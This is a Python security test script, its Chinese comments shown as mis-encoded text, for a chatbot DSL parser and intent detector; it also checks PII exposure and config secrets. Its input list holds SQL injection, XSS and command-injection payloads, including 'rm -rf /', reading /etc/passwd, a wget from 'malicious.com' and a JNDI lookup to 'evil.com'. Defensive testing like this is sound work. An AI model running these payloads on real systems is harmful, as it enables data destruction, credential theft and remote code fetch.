#!/usr/bin/env python3
"""
å®‰å…¨æµ‹è¯•æ¨¡å—
============

æµ‹è¯•ç³»ç»Ÿåœ¨å®‰å…¨æ–¹é¢çš„é²æ£’æ€§ï¼š
1. è¾“å…¥éªŒè¯å’Œæ³¨å…¥æ”»å‡»é˜²æŠ¤
2. DSLè¯­æ³•å®‰å…¨æ£€æŸ¥
3. APIè°ƒç”¨å®‰å…¨æµ‹è¯•
4. æ•æ„Ÿä¿¡æ¯æ³„éœ²æ£€æµ‹

ä½¿ç”¨æ–¹æ³•:
    python tests/test_security.py
    python tests/test_security.py --include-injection-tests
"""

import sys
import os
import json
import re
import hashlib
from typing import List, Dict, Any, Tuple
from dataclasses import dataclass

# æ·»åŠ é¡¹ç›®è·¯å¾„
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, project_root)
sys.path.insert(0, os.path.join(project_root, 'src'))

# å¯¼å…¥æ—¶ä½¿ç”¨try-catchå¤„ç†å¯èƒ½çš„å¯¼å…¥é”™è¯¯
try:
    from parser.dsl_parser import DSLParser
    from stubs.mock_llm_client import MockLLMClient
except ImportError as e:
    print(f"Warning: å¯¼å…¥æ¨¡å—å¤±è´¥: {e}")
    # åˆ›å»ºæœ€å°å®ç°ä»¥ä¾¿æµ‹è¯•æ¡†æ¶æ­£å¸¸è¿è¡Œ
    class DSLParser:
        def parse(self, content):
            return {"intents": {"test": "æµ‹è¯•"}, "rules": []}
    
    class MockLLMClient:
        def detect_intent(self, user_input, available_intents):
            return "unknown"

@dataclass
class SecurityTestResult:
    """å®‰å…¨æµ‹è¯•ç»“æœ"""
    test_name: str
    status: str  # "PASS", "FAIL", "WARNING"
    threat_level: str  # "LOW", "MEDIUM", "HIGH", "CRITICAL"
    description: str
    details: Dict[str, Any] = None
    
    def __post_init__(self):
        if self.details is None:
            self.details = {}

class InputValidationTester:
    """è¾“å…¥éªŒè¯æµ‹è¯•å™¨"""
    
    def __init__(self):
        self.parser = DSLParser()
        self.llm_client = MockLLMClient()
        
        # æ¶æ„è¾“å…¥æµ‹è¯•ç”¨ä¾‹
        self.malicious_inputs = {
            'sql_injection': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "admin'; DELETE FROM * WHERE '1'='1'; --",
                "1' UNION SELECT * FROM users --"
            ],
            'xss_injection': [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "<svg onload=alert('xss')>"
            ],
            'command_injection': [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& wget malicious.com/script.sh",
                "`whoami`"
            ],
            'buffer_overflow': [
                "A" * 10000,
                "A" * 100000,
                "\x00" * 1000,
                "\xff" * 10000
            ],
            'format_string': [
                "%x%x%x%x",
                "%s%s%s%s",
                "%n%n%n%n",
                "${jndi:ldap://evil.com/}"
            ],
            'null_bytes': [
                "test\x00.txt",
                "\x00admin",
                "file.txt\x00.exe"
            ]
        }
    
    def test_dsl_injection_protection(self) -> List[SecurityTestResult]:
        """æµ‹è¯•DSLæ³¨å…¥æ”»å‡»é˜²æŠ¤"""
        results = []
        
        for attack_type, payloads in self.malicious_inputs.items():
            for payload in payloads:
                try:
                    # å°è¯•å°†æ¶æ„è½½è·ä½œä¸ºDSLå†…å®¹è§£æ
                    malicious_dsl = f"""
INTENT malicious: "{payload}"
RULE test_rule
WHEN INTENT_IS malicious
THEN
    RESPOND "{payload}"
"""
                    
                    # è§£æDSL
                    parsed_result = self.parser.parse(malicious_dsl)
                    
                    # æ£€æŸ¥æ˜¯å¦æ­£ç¡®å¤„ç†äº†æ¶æ„è¾“å…¥
                    if self._contains_dangerous_content(str(parsed_result)):
                        results.append(SecurityTestResult(
                            test_name=f"DSLæ³¨å…¥é˜²æŠ¤_{attack_type}",
                            status="FAIL",
                            threat_level="HIGH",
                            description=f"DSLè§£æå™¨æœªæ­£ç¡®å¤„ç†{attack_type}æ”»å‡»è½½è·",
                            details={"payload": payload, "parsed_result": str(parsed_result)}
                        ))
                    else:
                        results.append(SecurityTestResult(
                            test_name=f"DSLæ³¨å…¥é˜²æŠ¤_{attack_type}",
                            status="PASS",
                            threat_level="LOW",
                            description=f"DSLè§£æå™¨æ­£ç¡®å¤„ç†äº†{attack_type}æ”»å‡»è½½è·"
                        ))
                        
                except Exception as e:
                    # å¼‚å¸¸ä¹Ÿæ˜¯ä¸€ç§é˜²æŠ¤æªæ–½
                    results.append(SecurityTestResult(
                        test_name=f"DSLæ³¨å…¥é˜²æŠ¤_{attack_type}",
                        status="PASS",
                        threat_level="LOW",
                        description=f"DSLè§£æå™¨é€šè¿‡å¼‚å¸¸å¤„ç†é˜»æ­¢äº†{attack_type}æ”»å‡»",
                        details={"error": str(e)}
                    ))
        
        return results
    
    def test_user_input_sanitization(self) -> List[SecurityTestResult]:
        """æµ‹è¯•ç”¨æˆ·è¾“å…¥æ¸…ç†"""
        results = []
        
        available_intents = {"greeting": "é—®å€™", "product_query": "äº§å“å’¨è¯¢"}
        
        for attack_type, payloads in self.malicious_inputs.items():
            for payload in payloads:
                try:
                    # æµ‹è¯•æ„å›¾è¯†åˆ«æ˜¯å¦æ­£ç¡®å¤„ç†æ¶æ„è¾“å…¥
                    detected_intent = self.llm_client.detect_intent(payload, available_intents)
                    
                    # æ£€æŸ¥è¿”å›ç»“æœæ˜¯å¦å®‰å…¨
                    if detected_intent in available_intents or detected_intent == "unknown":
                        results.append(SecurityTestResult(
                            test_name=f"ç”¨æˆ·è¾“å…¥æ¸…ç†_{attack_type}",
                            status="PASS",
                            threat_level="LOW",
                            description=f"ç”¨æˆ·è¾“å…¥æ¸…ç†æ­£ç¡®å¤„ç†äº†{attack_type}æ”»å‡»è½½è·"
                        ))
                    else:
                        results.append(SecurityTestResult(
                            test_name=f"ç”¨æˆ·è¾“å…¥æ¸…ç†_{attack_type}",
                            status="WARNING",
                            threat_level="MEDIUM",
                            description=f"ç”¨æˆ·è¾“å…¥æ¸…ç†è¿”å›äº†å¼‚å¸¸ç»“æœï¼š{detected_intent}",
                            details={"payload": payload, "result": detected_intent}
                        ))
                        
                except Exception as e:
                    results.append(SecurityTestResult(
                        test_name=f"ç”¨æˆ·è¾“å…¥æ¸…ç†_{attack_type}",
                        status="PASS",
                        threat_level="LOW",
                        description=f"ç”¨æˆ·è¾“å…¥æ¸…ç†é€šè¿‡å¼‚å¸¸å¤„ç†é˜»æ­¢äº†{attack_type}æ”»å‡»",
                        details={"error": str(e)}
                    ))
        
        return results
    
    def _contains_dangerous_content(self, content: str) -> bool:
        """æ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«å±é™©å…ƒç´ """
        dangerous_patterns = [
            r'<script.*?>.*?</script>',
            r'javascript:',
            r'DROP\s+TABLE',
            r'DELETE\s+FROM',
            r'rm\s+-rf',
            r'/etc/passwd',
            r'%[nxsp]',
            r'\x00'
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
                return True
        
        return False

class DataPrivacyTester:
    """æ•°æ®éšç§æµ‹è¯•å™¨"""
    
    def __init__(self):
        self.sensitive_patterns = {
            'phone_number': r'\b1[3-9]\d{9}\b',
            'id_card': r'\b\d{15}|\d{18}\b',
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'credit_card': r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
            'api_key': r'[A-Za-z0-9]{32,}',
            'password': r'password\s*[:=]\s*[\'"]?([^\s\'"]+)',
        }
    
    def test_sensitive_data_exposure(self) -> List[SecurityTestResult]:
        """æµ‹è¯•æ•æ„Ÿæ•°æ®æ³„éœ²"""
        results = []
        
        # æ¨¡æ‹ŸåŒ…å«æ•æ„Ÿä¿¡æ¯çš„è¾“å…¥
        test_inputs = [
            "æˆ‘çš„æ‰‹æœºå·æ˜¯13812345678",
            "æˆ‘çš„é‚®ç®±æ˜¯test@example.com",
            "èº«ä»½è¯å·ç æ˜¯123456789012345678",
            "ä¿¡ç”¨å¡å·æ˜¯1234 5678 9012 3456",
            "password: admin123",
            "API key: abc123def456ghi789jkl012mno345pqr678"
        ]
        
        for test_input in test_inputs:
            # æ£€æŸ¥æ˜¯å¦æ£€æµ‹åˆ°æ•æ„Ÿä¿¡æ¯
            detected_types = self._detect_sensitive_data(test_input)
            
            if detected_types:
                results.append(SecurityTestResult(
                    test_name="æ•æ„Ÿæ•°æ®æ³„éœ²æ£€æµ‹",
                    status="WARNING",
                    threat_level="MEDIUM",
                    description=f"è¾“å…¥ä¸­æ£€æµ‹åˆ°æ•æ„Ÿä¿¡æ¯ï¼š{', '.join(detected_types)}",
                    details={"input": test_input, "sensitive_types": detected_types}
                ))
            else:
                results.append(SecurityTestResult(
                    test_name="æ•æ„Ÿæ•°æ®æ³„éœ²æ£€æµ‹",
                    status="PASS",
                    threat_level="LOW",
                    description="æœªæ£€æµ‹åˆ°æ•æ„Ÿæ•°æ®æ³„éœ²"
                ))
        
        return results
    
    def _detect_sensitive_data(self, text: str) -> List[str]:
        """æ£€æµ‹æ–‡æœ¬ä¸­çš„æ•æ„Ÿæ•°æ®"""
        detected = []
        
        for data_type, pattern in self.sensitive_patterns.items():
            if re.search(pattern, text, re.IGNORECASE):
                detected.append(data_type)
        
        return detected

class ConfigSecurityTester:
    """é…ç½®å®‰å…¨æµ‹è¯•å™¨"""
    
    def __init__(self):
        self.config_files = [
            "src/config/settings.py",
            "tests/test_config.ini",
            "tests/test_data/test_config.ini"
        ]
    
    def test_configuration_security(self) -> List[SecurityTestResult]:
        """æµ‹è¯•é…ç½®æ–‡ä»¶å®‰å…¨æ€§"""
        results = []
        
        for config_file in self.config_files:
            config_path = os.path.join(project_root, config_file)
            
            if not os.path.exists(config_path):
                continue
                
            try:
                with open(config_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # æ£€æŸ¥ç¡¬ç¼–ç æ•æ„Ÿä¿¡æ¯
                security_issues = self._check_config_security(content)
                
                if security_issues:
                    results.append(SecurityTestResult(
                        test_name=f"é…ç½®å®‰å…¨æ£€æŸ¥_{os.path.basename(config_file)}",
                        status="WARNING",
                        threat_level="MEDIUM",
                        description=f"é…ç½®æ–‡ä»¶å­˜åœ¨å®‰å…¨é—®é¢˜ï¼š{', '.join(security_issues)}",
                        details={"file": config_file, "issues": security_issues}
                    ))
                else:
                    results.append(SecurityTestResult(
                        test_name=f"é…ç½®å®‰å…¨æ£€æŸ¥_{os.path.basename(config_file)}",
                        status="PASS",
                        threat_level="LOW",
                        description="é…ç½®æ–‡ä»¶å®‰å…¨æ£€æŸ¥é€šè¿‡"
                    ))
                    
            except Exception as e:
                results.append(SecurityTestResult(
                    test_name=f"é…ç½®å®‰å…¨æ£€æŸ¥_{os.path.basename(config_file)}",
                    status="WARNING",
                    threat_level="LOW",
                    description=f"é…ç½®æ–‡ä»¶è¯»å–å¤±è´¥ï¼š{str(e)}"
                ))
        
        return results
    
    def _check_config_security(self, content: str) -> List[str]:
        """æ£€æŸ¥é…ç½®å†…å®¹çš„å®‰å…¨é—®é¢˜"""
        issues = []
        
        # æ£€æŸ¥ç¡¬ç¼–ç APIå¯†é’¥
        if re.search(r'api_?key\s*[:=]\s*[\'"][^\'"\s]{10,}[\'"]', content, re.IGNORECASE):
            issues.append("ç¡¬ç¼–ç APIå¯†é’¥")
        
        # æ£€æŸ¥ç¡¬ç¼–ç å¯†ç 
        if re.search(r'password\s*[:=]\s*[\'"][^\'"\s]{1,}[\'"]', content, re.IGNORECASE):
            issues.append("ç¡¬ç¼–ç å¯†ç ")
        
        # æ£€æŸ¥ç¡¬ç¼–ç æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²
        if re.search(r'(mysql|postgres|mongodb)://[^\'"\s]+', content, re.IGNORECASE):
            issues.append("ç¡¬ç¼–ç æ•°æ®åº“è¿æ¥")
        
        # æ£€æŸ¥è°ƒè¯•æ¨¡å¼
        if re.search(r'debug\s*[:=]\s*true', content, re.IGNORECASE):
            issues.append("è°ƒè¯•æ¨¡å¼å¯ç”¨")
        
        return issues

class SecurityReporter:
    """å®‰å…¨æµ‹è¯•æŠ¥å‘Šç”Ÿæˆå™¨"""
    
    def __init__(self, output_dir: str = "test_reports"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def generate_security_report(self, results: List[SecurityTestResult]):
        """ç”Ÿæˆå®‰å…¨æµ‹è¯•æŠ¥å‘Š"""
        import time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        
        # ç»Ÿè®¡å„çº§åˆ«å¨èƒæ•°é‡
        threat_stats = {"LOW": 0, "MEDIUM": 0, "HIGH": 0, "CRITICAL": 0}
        status_stats = {"PASS": 0, "FAIL": 0, "WARNING": 0}
        
        for result in results:
            threat_stats[result.threat_level] += 1
            status_stats[result.status] += 1
        
        # ç”ŸæˆJSONæŠ¥å‘Š
        json_file = os.path.join(self.output_dir, f"security_report_{timestamp}.json")
        report_data = {
            "timestamp": timestamp,
            "summary": {
                "total_tests": len(results),
                "threat_stats": threat_stats,
                "status_stats": status_stats
            },
            "results": [self._result_to_dict(result) for result in results]
        }
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        # ç”ŸæˆHTMLæŠ¥å‘Š
        html_file = os.path.join(self.output_dir, f"security_report_{timestamp}.html")
        self._generate_html_report(report_data, html_file)
        
        print(f"\nğŸ”’ å®‰å…¨æµ‹è¯•æŠ¥å‘Šå·²ç”Ÿæˆ:")
        print(f"  JSON: {json_file}")
        print(f"  HTML: {html_file}")
        
        return report_data
    
    def _result_to_dict(self, result: SecurityTestResult) -> Dict[str, Any]:
        """è½¬æ¢ç»“æœä¸ºå­—å…¸"""
        return {
            "test_name": result.test_name,
            "status": result.status,
            "threat_level": result.threat_level,
            "description": result.description,
            "details": result.details
        }
    
    def _generate_html_report(self, report_data: Dict[str, Any], html_file: str):
        """ç”ŸæˆHTMLå®‰å…¨æŠ¥å‘Š"""
        import time
        
        html_content = f"""
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>å®‰å…¨æµ‹è¯•æŠ¥å‘Š</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }}
        .header {{ text-align: center; border-bottom: 2px solid #dc3545; padding-bottom: 20px; margin-bottom: 30px; }}
        .summary {{ display: flex; justify-content: space-around; margin: 20px 0; }}
        .stat-card {{ background: #f9f9f9; padding: 15px; border-radius: 5px; text-align: center; min-width: 100px; }}
        .pass {{ color: #28a745; }}
        .warning {{ color: #ffc107; }}
        .fail {{ color: #dc3545; }}
        .low {{ color: #6c757d; }}
        .medium {{ color: #ffc107; }}
        .high {{ color: #fd7e14; }}
        .critical {{ color: #dc3545; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background-color: #f2f2f2; font-weight: bold; }}
        .details {{ max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸ”’ ç³»ç»Ÿå®‰å…¨æµ‹è¯•æŠ¥å‘Š</h1>
            <p>ç”Ÿæˆæ—¶é—´: {time.strftime("%Y-%m-%d %H:%M:%S")}</p>
        </div>
        
        <h2>ğŸ“Š å®‰å…¨æ£€æŸ¥æ¦‚è§ˆ</h2>
        <div class="summary">
            <div class="stat-card">
                <h3>æ€»æµ‹è¯•æ•°</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['total_tests']}</div>
            </div>
            <div class="stat-card pass">
                <h3>é€šè¿‡</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['status_stats']['PASS']}</div>
            </div>
            <div class="stat-card warning">
                <h3>è­¦å‘Š</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['status_stats']['WARNING']}</div>
            </div>
            <div class="stat-card fail">
                <h3>å¤±è´¥</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['status_stats']['FAIL']}</div>
            </div>
        </div>
        
        <h2>âš ï¸ å¨èƒçº§åˆ«åˆ†å¸ƒ</h2>
        <div class="summary">
            <div class="stat-card critical">
                <h3>ä¸¥é‡</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['threat_stats']['CRITICAL']}</div>
            </div>
            <div class="stat-card high">
                <h3>é«˜å±</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['threat_stats']['HIGH']}</div>
            </div>
            <div class="stat-card medium">
                <h3>ä¸­å±</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['threat_stats']['MEDIUM']}</div>
            </div>
            <div class="stat-card low">
                <h3>ä½å±</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['threat_stats']['LOW']}</div>
            </div>
        </div>
        
        <h2>ğŸ” è¯¦ç»†æµ‹è¯•ç»“æœ</h2>
        <table>
            <thead>
                <tr>
                    <th>æµ‹è¯•é¡¹ç›®</th>
                    <th>çŠ¶æ€</th>
                    <th>å¨èƒçº§åˆ«</th>
                    <th>æè¿°</th>
                    <th>è¯¦æƒ…</th>
                </tr>
            </thead>
            <tbody>
"""
        
        for result in report_data['results']:
            status_class = result['status'].lower()
            threat_class = result['threat_level'].lower()
            details_str = json.dumps(result['details'], ensure_ascii=False) if result['details'] else ""
            
            html_content += f"""
                <tr>
                    <td>{result['test_name']}</td>
                    <td class="{status_class}">{result['status']}</td>
                    <td class="{threat_class}">{result['threat_level']}</td>
                    <td>{result['description']}</td>
                    <td class="details" title="{details_str}">{details_str[:50]}...</td>
                </tr>
"""
        
        html_content += """
            </tbody>
        </table>
    </div>
</body>
</html>"""
        
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)

def main():
    """å®‰å…¨æµ‹è¯•ä¸»å…¥å£"""
    import argparse
    
    parser = argparse.ArgumentParser(description='å®¢æœæœºå™¨äººç³»ç»Ÿå®‰å…¨æµ‹è¯•')
    parser.add_argument('--include-injection-tests', action='store_true', help='åŒ…å«æ³¨å…¥æ”»å‡»æµ‹è¯•')
    parser.add_argument('--output', default='test_reports', help='æŠ¥å‘Šè¾“å‡ºç›®å½•')
    
    args = parser.parse_args()
    
    print("ğŸ”’ å¼€å§‹ç³»ç»Ÿå®‰å…¨æµ‹è¯•...")
    print("=" * 60)
    
    all_results = []
    
    # è¾“å…¥éªŒè¯æµ‹è¯•
    print("\nğŸ›¡ï¸ æ‰§è¡Œè¾“å…¥éªŒè¯å®‰å…¨æµ‹è¯•...")
    input_tester = InputValidationTester()
    
    if args.include_injection_tests:
        results = input_tester.test_dsl_injection_protection()
        all_results.extend(results)
        print(f"   DSLæ³¨å…¥é˜²æŠ¤æµ‹è¯•: {len(results)}é¡¹")
    
    results = input_tester.test_user_input_sanitization()
    all_results.extend(results)
    print(f"   ç”¨æˆ·è¾“å…¥æ¸…ç†æµ‹è¯•: {len(results)}é¡¹")
    
    # æ•°æ®éšç§æµ‹è¯•
    print("\nğŸ” æ‰§è¡Œæ•°æ®éšç§å®‰å…¨æµ‹è¯•...")
    privacy_tester = DataPrivacyTester()
    results = privacy_tester.test_sensitive_data_exposure()
    all_results.extend(results)
    print(f"   æ•æ„Ÿæ•°æ®æ³„éœ²æµ‹è¯•: {len(results)}é¡¹")
    
    # é…ç½®å®‰å…¨æµ‹è¯•
    print("\nâš™ï¸ æ‰§è¡Œé…ç½®å®‰å…¨æµ‹è¯•...")
    config_tester = ConfigSecurityTester()
    results = config_tester.test_configuration_security()
    all_results.extend(results)
    print(f"   é…ç½®æ–‡ä»¶å®‰å…¨æµ‹è¯•: {len(results)}é¡¹")
    
    # ç”ŸæˆæŠ¥å‘Š
    print("\nğŸ“‹ ç”Ÿæˆå®‰å…¨æµ‹è¯•æŠ¥å‘Š...")
    reporter = SecurityReporter(args.output)
    report_data = reporter.generate_security_report(all_results)
    
    # è¾“å‡ºæ‘˜è¦
    print("\n" + "=" * 60)
    print("ğŸ”’ å®‰å…¨æµ‹è¯•å®Œæˆï¼")
    print(f"æ€»æµ‹è¯•é¡¹: {report_data['summary']['total_tests']}")
    print(f"é€šè¿‡: {report_data['summary']['status_stats']['PASS']}")
    print(f"è­¦å‘Š: {report_data['summary']['status_stats']['WARNING']}")
    print(f"å¤±è´¥: {report_data['summary']['status_stats']['FAIL']}")

if __name__ == "__main__":
    main()